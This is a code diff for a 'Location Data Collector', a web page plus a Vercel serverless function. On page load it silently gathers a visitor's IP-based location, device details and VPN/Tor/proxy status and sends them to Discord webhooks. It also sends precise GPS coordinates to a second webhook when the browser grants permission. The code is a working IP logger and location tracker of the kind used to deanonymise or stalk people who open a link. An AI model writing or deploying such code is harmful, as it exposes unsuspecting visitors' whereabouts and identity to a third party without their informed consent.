@@ -1,230 +1,196 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Location Data Collector</title>
-    <style>
-        body { font-family: Arial, sans-serif; max-width: 800px; margin: 40px auto; padding: 20px; }
-        .status { padding: 15px; margin: 15px 0; border-radius: 5px; }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
-        .info { background: #d1ecf1; color: #0c5460; }
-        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        button:disabled { background: #ccc; }
-    </style>
-</head>
-<body>
-    <h1>Location Data Collection</h1>
-    <div id="status" class="status info">Initializing...</div>
-    <button id="getLocationBtn" onclick="requestGPSLocation()">Get Precise Location</button>
+// api/log.js - Vercel Serverless Function
+
+const fetch = require('node-fetch');
+
+export default async function handler(req, res) {
+  // Enable CORS for browser requests
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  
+  // Handle preflight
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+  
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
+  
+  try {
+    const API_KEY = process.env.BIGDATACLOUD_API_KEY;
+    const IP_WEBHOOK_URL = process.env.IP_GEOLOCATION_WEBHOOK;
+    const GPS_WEBHOOK_URL = process.env.REVERSE_GEOCODE_WEBHOOK;
     
-    <script>
-        // Configuration - REPLACE THESE WITH YOUR VALUES
-        const API_KEY = 'BIGDATACLOUD_API_KEY'; // Get from: https://www.bigdatacloud.com/account
-        const IP_GEOLOCATION_WEBHOOK = 'DISCORD_WEBHOOK_URL';
-        const REVERSE_GEOCODE_WEBHOOK = 'DISCORD_WEBHOOK_URL';
-        
-        // Status element
-        const statusEl = document.getElementById('status');
-        
-        // Always run IP geolocation on page load
-        window.addEventListener('load', () => {
-            fetchIPGeolocationData();
-        });
-        
-        // Function to always get IP geolocation
-        async function fetchIPGeolocationData() {
-            statusEl.textContent = 'Getting IP geolocation data...';
-            statusEl.className = 'status info';
-            
-            try {
-                // Fetch all required data in parallel
-                const [ipGeoData, userAgentData, riskData] = await Promise.all([
-                    fetch(`https://api-bdc.net/data/ip-geolocation-full?key=${API_KEY}`).then(r => r.json()),
-                    fetch(`https://api-bdc.net/data/user-agent-info?key=${API_KEY}`).then(r => r.json()),
-                    fetch(`https://api-bdc.net/data/user-risk?key=${API_KEY}`).then(r => r.json())
-                ]);
-                
-                // Prepare webhook data with your specified field names
-                const webhookData = {
-                    // IP Geolocation data
-                    'IP Address (ip)': ipGeoData.ip || 'N/A',
-                    'Continent (continent)': ipGeoData.location?.continent || 'N/A',
-                    'Country (name)': ipGeoData.country?.name || 'N/A',
-                    'Region (principalSubdivision)': ipGeoData.location?.principalSubdivision || 'N/A',
-                    'City (city)': ipGeoData.location?.city || ipGeoData.location?.localityName || 'N/A',
-                    'Locality (localityName)': ipGeoData.location?.localityName || 'N/A',
-                    'Post Code (postcode)': ipGeoData.location?.postcode || 'N/A',
-                    'Coordinates (latitude & longitude)': ipGeoData.location?.latitude && ipGeoData.location?.longitude 
-                        ? `${ipGeoData.location.latitude}, ${ipGeoData.location.longitude}` 
-                        : 'N/A',
-                    'Timezone (ianaTimeId)': ipGeoData.location?.timeZone?.ianaTimeId || 'N/A',
-                    'Localtime (localTime)': ipGeoData.location?.timeZone?.localTime || 'N/A',
-                    'ASN (asn inside carriers)': ipGeoData.network?.carriers?.[0]?.asn || 'N/A',
-                    'Organization (organisation inside carriers)': ipGeoData.network?.carriers?.[0]?.organisation || 'N/A',
-                    'Confidence (confidence)': ipGeoData.confidence || 'N/A',
-                    
-                    // Security data from hazardReport
-                    'Security Threat (securityThreat)': ipGeoData.securityThreat || 'N/A',
-                    'VPN (isKnownAsVpn)': ipGeoData.hazardReport?.isKnownAsVpn ? 'Yes' : 'No',
-                    'Proxy (isKnownAsProxy)': ipGeoData.hazardReport?.isKnownAsProxy ? 'Yes' : 'No',
-                    'Tor (isKnownAsTorServer)': ipGeoData.hazardReport?.isKnownAsTorServer ? 'Yes' : 'No',
-                    // Additional hazard info you wanted
-                    'Hosting ASN (isHostingAsn)': ipGeoData.hazardReport?.isHostingAsn ? 'Yes' : 'No',
-                    'Cellular Network (isCellular)': ipGeoData.hazardReport?.isCellular ? 'Yes' : 'No',
-                    'Public Router (isKnownAsPublicRouter)': ipGeoData.hazardReport?.isKnownAsPublicRouter ? 'Yes' : 'No',
-                    
-                    // User Agent and Risk data
-                    'Risk (risk)': riskData.risk || 'N/A',
-                    'User Agent (from the browser)': userAgentData.userAgent || navigator.userAgent,
-                    'Device (device)': userAgentData.device || 'N/A',
-                    'OS (os)': userAgentData.os || 'N/A',
-                    'Mobile (isMobile)': userAgentData.isMobile ? 'Yes' : 'No',
-                    'Bot (isSpider)': userAgentData.isSpider ? 'Yes' : 'No'
-                };
-                
-                // Send IP geolocation webhook (ALWAYS SENT)
-                await sendWebhook(IP_GEOLOCATION_WEBHOOK, {
-                    source: 'ip_geolocation',
-                    timestamp: new Date().toISOString(),
-                    data: webhookData,
-                    rawData: { ipGeoData, userAgentData, riskData } // Include raw data for reference
-                });
-                
-                statusEl.textContent = 'IP geolocation data collected and sent! Click button above for precise GPS location.';
-                statusEl.className = 'status success';
-                
-                return ipGeoData;
-                
-            } catch (error) {
-                statusEl.textContent = `Error fetching IP geolocation: ${error.message}`;
-                statusEl.className = 'status error';
-                console.error('IP Geolocation Error:', error);
-            }
-        }
-        
-        // Function to request GPS location
-        async function requestGPSLocation() {
-            const button = document.getElementById('getLocationBtn');
-            button.disabled = true;
-            button.textContent = 'Requesting GPS...';
-            
-            statusEl.textContent = 'Requesting GPS permission...';
-            statusEl.className = 'status info';
-            
-            if (!navigator.geolocation) {
-                statusEl.textContent = 'Geolocation is not supported by your browser';
-                statusEl.className = 'status error';
-                button.disabled = false;
-                button.textContent = 'Get Precise Location';
-                return;
-            }
-            
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    // GPS granted - get reverse geocode data
-                    const { latitude, longitude } = position.coords;
-                    statusEl.textContent = `GPS location obtained: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
-                    
-                    try {
-                        const reverseGeoData = await fetch(
-                            `https://api-bdc.net/data/reverse-geocode-with-timezone?latitude=${latitude}&longitude=${longitude}&key=${API_KEY}`
-                        ).then(r => r.json());
-                        
-                        // Prepare reverse geocode webhook data
-                        const reverseWebhookData = {
-                            'Source': 'gps_reverse_geocode',
-                            'IP Address (ip)': 'From GPS - Not applicable',
-                            'Continent (continent)': reverseGeoData.continent || 'N/A',
-                            'Country (name)': reverseGeoData.countryName || 'N/A',
-                            'Region (principalSubdivision)': reverseGeoData.principalSubdivision || 'N/A',
-                            'City (city)': reverseGeoData.city || 'N/A',
-                            'Locality (locality)': reverseGeoData.locality || 'N/A',
-                            'Post Code (postcode)': reverseGeoData.postcode || 'N/A',
-                            'Coordinates (latitude & longitude)': `${reverseGeoData.latitude}, ${reverseGeoData.longitude}`,
-                            'Timezone (ianaTimeId)': reverseGeoData.timeZone?.ianaTimeId || 'N/A',
-                            'Localtime (localTime)': reverseGeoData.timeZone?.localTime || 'N/A',
-                            'ASN (asn inside carriers)': 'From GPS - Not applicable',
-                            'Organization (organisation inside carriers)': 'From GPS - Not applicable',
-                            'Confidence (confidence)': 'High (GPS)',
-                            'Security Threat (securityThreat)': 'From GPS - Not applicable',
-                            'VPN (isKnownAsVpn)': 'From GPS - Not applicable',
-                            'Proxy (isKnownAsProxy)': 'From GPS - Not applicable',
-                            'Tor (isKnownAsTorServer)': 'From GPS - Not applicable',
-                            'GPS Accuracy (meters)': position.coords.accuracy || 'N/A',
-                            'GPS Altitude': position.coords.altitude || 'N/A'
-                        };
-                        
-                        // Send separate webhook for reverse geocode data
-                        await sendWebhook(REVERSE_GEOCODE_WEBHOOK, {
-                            source: 'gps_reverse_geocode',
-                            timestamp: new Date().toISOString(),
-                            gpsCoordinates: { latitude, longitude },
-                            data: reverseWebhookData,
-                            rawData: reverseGeoData
-                        });
-                        
-                        statusEl.textContent = '✓ GPS location data collected and sent! (Check separate webhook)';
-                        statusEl.className = 'status success';
-                        
-                    } catch (error) {
-                        statusEl.textContent = `Error with reverse geocoding: ${error.message}`;
-                        statusEl.className = 'status error';
-                    }
-                    
-                    button.disabled = false;
-                    button.textContent = 'Get Precise Location';
-                },
-                (error) => {
-                    // GPS denied or error
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            statusEl.textContent = 'GPS permission denied. Using IP location only.';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            statusEl.textContent = 'Location information unavailable.';
-                            break;
-                        case error.TIMEOUT:
-                            statusEl.textContent = 'Location request timed out.';
-                            break;
-                        default:
-                            statusEl.textContent = 'Unknown error getting location.';
-                    }
-                    statusEl.className = 'status error';
-                    button.disabled = false;
-                    button.textContent = 'Get Precise Location';
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-        }
-        
-        // Function to send webhook
-        async function sendWebhook(url, data) {
-            if (!url || url.includes('YOUR_')) {
-                console.warn('Webhook URL not configured. Data:', data);
-                return;
-            }
-            
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`Webhook failed: ${response.status}`);
-                }
-                
-                console.log('Webhook sent successfully');
-            } catch (error) {
-                console.error('Webhook Error:', error);
-                // Don't show to user - webhook failure shouldn't break UX
-            }
-        }
-    </script>
-</body>
-</html>
+    if (!API_KEY) {
+      return res.status(500).json({ error: 'API key not configured' });
+    }
+    
+    const { gpsCoordinates, userAgent } = req.body;
+    const clientIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress;
+    
+    // Always get IP geolocation first
+    const ipGeoData = await fetchIPGeolocation(clientIP, API_KEY);
+    const userAgentData = await fetchUserAgentInfo(userAgent, API_KEY);
+    const riskData = await fetchRiskInfo(API_KEY);
+    
+    // Prepare and send IP webhook
+    const ipWebhookData = prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP);
+    await sendWebhook(IP_WEBHOOK_URL, {
+      source: 'server_ip_geolocation',
+      timestamp: new Date().toISOString(),
+      data: ipWebhookData
+    });
+    
+    let gpsResponse = null;
+    
+    // If GPS coordinates provided, get reverse geocode
+    if (gpsCoordinates && gpsCoordinates.latitude && gpsCoordinates.longitude) {
+      const reverseGeoData = await fetchReverseGeocode(
+        gpsCoordinates.latitude, 
+        gpsCoordinates.longitude, 
+        API_KEY
+      );
+      
+      // Prepare and send GPS webhook
+      const gpsWebhookData = prepareGPSWebhookData(reverseGeoData, gpsCoordinates);
+      await sendWebhook(GPS_WEBHOOK_URL, {
+        source: 'server_gps_reverse_geocode',
+        timestamp: new Date().toISOString(),
+        data: gpsWebhookData
+      });
+      
+      gpsResponse = {
+        success: true,
+        message: 'GPS reverse geocode data sent',
+        gpsData: gpsWebhookData
+      };
+    }
+    
+    // Return response to client
+    res.status(200).json({
+      success: true,
+      ipDataSent: true,
+      gpsDataSent: !!gpsCoordinates,
+      ipData: ipWebhookData,
+      gpsData: gpsResponse?.gpsData || null
+    });
+    
+  } catch (error) {
+    console.error('Server error:', error);
+    res.status(500).json({ 
+      error: 'Internal server error',
+      message: error.message 
+    });
+  }
+}
+
+// Helper functions
+async function fetchIPGeolocation(ip, apiKey) {
+  const response = await fetch(
+    `https://api-bdc.net/data/ip-geolocation-full?ip=${ip}&key=${apiKey}`
+  );
+  return response.json();
+}
+
+async function fetchUserAgentInfo(userAgentString, apiKey) {
+  const response = await fetch(
+    `https://api-bdc.net/data/user-agent-info?key=${apiKey}&userAgent=${encodeURIComponent(userAgentString)}`
+  );
+  return response.json();
+}
+
+async function fetchRiskInfo(apiKey) {
+  const response = await fetch(
+    `https://api-bdc.net/data/user-risk?key=${apiKey}`
+  );
+  return response.json();
+}
+
+async function fetchReverseGeocode(lat, lng, apiKey) {
+  const response = await fetch(
+    `https://api-bdc.net/data/reverse-geocode-with-timezone?latitude=${lat}&longitude=${lng}&key=${apiKey}`
+  );
+  return response.json();
+}
+
+function prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP) {
+  return {
+    'IP Address (ip)': ipGeoData.ip || clientIP,
+    'Continent (continent)': ipGeoData.location?.continent || 'N/A',
+    'Country (name)': ipGeoData.country?.name || 'N/A',
+    'Region (principalSubdivision)': ipGeoData.location?.principalSubdivision || 'N/A',
+    'City (city)': ipGeoData.location?.city || ipGeoData.location?.localityName || 'N/A',
+    'Locality (localityName)': ipGeoData.location?.localityName || 'N/A',
+    'Post Code (postcode)': ipGeoData.location?.postcode || 'N/A',
+    'Coordinates (latitude & longitude)': ipGeoData.location?.latitude && ipGeoData.location?.longitude 
+      ? `${ipGeoData.location.latitude}, ${ipGeoData.location.longitude}` 
+      : 'N/A',
+    'Timezone (ianaTimeId)': ipGeoData.location?.timeZone?.ianaTimeId || 'N/A',
+    'Localtime (localTime)': ipGeoData.location?.timeZone?.localTime || 'N/A',
+    'ASN (asn inside carriers)': ipGeoData.network?.carriers?.[0]?.asn || 'N/A',
+    'Organization (organisation inside carriers)': ipGeoData.network?.carriers?.[0]?.organisation || 'N/A',
+    'Confidence (confidence)': ipGeoData.confidence || 'N/A',
+    
+    // Security data
+    'Security Threat (securityThreat)': ipGeoData.securityThreat || 'N/A',
+    'VPN (isKnownAsVpn)': ipGeoData.hazardReport?.isKnownAsVpn ? 'Yes' : 'No',
+    'Proxy (isKnownAsProxy)': ipGeoData.hazardReport?.isKnownAsProxy ? 'Yes' : 'No',
+    'Tor (isKnownAsTorServer)': ipGeoData.hazardReport?.isKnownAsTorServer ? 'Yes' : 'No',
+    'Hosting ASN (isHostingAsn)': ipGeoData.hazardReport?.isHostingAsn ? 'Yes' : 'No',
+    'Cellular Network (isCellular)': ipGeoData.hazardReport?.isCellular ? 'Yes' : 'No',
+    
+    // Risk and User Agent
+    'Risk (risk)': riskData.risk || 'N/A',
+    'User Agent (from the browser)': userAgentData.userAgent || 'N/A',
+    'Device (device)': userAgentData.device || 'N/A',
+    'OS (os)': userAgentData.os || 'N/A',
+    'Mobile (isMobile)': userAgentData.isMobile ? 'Yes' : 'No',
+    'Bot (isSpider)': userAgentData.isSpider ? 'Yes' : 'No'
+  };
+}
+
+function prepareGPSWebhookData(reverseGeoData, gpsCoordinates) {
+  return {
+    'Source': 'gps_reverse_geocode',
+    'IP Address (ip)': 'GPS-based - Not applicable',
+    'Continent (continent)': reverseGeoData.continent || 'N/A',
+    'Country (name)': reverseGeoData.countryName || 'N/A',
+    'Region (principalSubdivision)': reverseGeoData.principalSubdivision || 'N/A',
+    'City (city)': reverseGeoData.city || 'N/A',
+    'Locality (locality)': reverseGeoData.locality || 'N/A',
+    'Post Code (postcode)': reverseGeoData.postcode || 'N/A',
+    'Coordinates (latitude & longitude)': `${reverseGeoData.latitude}, ${reverseGeoData.longitude}`,
+    'Timezone (ianaTimeId)': reverseGeoData.timeZone?.ianaTimeId || 'N/A',
+    'Localtime (localTime)': reverseGeoData.timeZone?.localTime || 'N/A',
+    'ASN (asn inside carriers)': 'GPS-based - Not applicable',
+    'Organization (organisation inside carriers)': 'GPS-based - Not applicable',
+    'Confidence (confidence)': 'High (GPS)',
+    'GPS Accuracy': 'Direct GPS coordinates',
+    'GPS Source': 'Browser geolocation API'
+  };
+}
+
+async function sendWebhook(webhookUrl, data) {
+  if (!webhookUrl || webhookUrl.includes('YOUR_')) {
+    console.log('Webhook not sent - URL not configured:', data);
+    return { sent: false, reason: 'URL not configured' };
+  }
+  
+  try {
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
+    
+    return { 
+      sent: response.ok, 
+      status: response.status,
+      statusText: response.statusText
+    };
+  } catch (error) {
+    console.error('Webhook error:', error);
+    return { sent: false, error: error.message };
+  }
+}
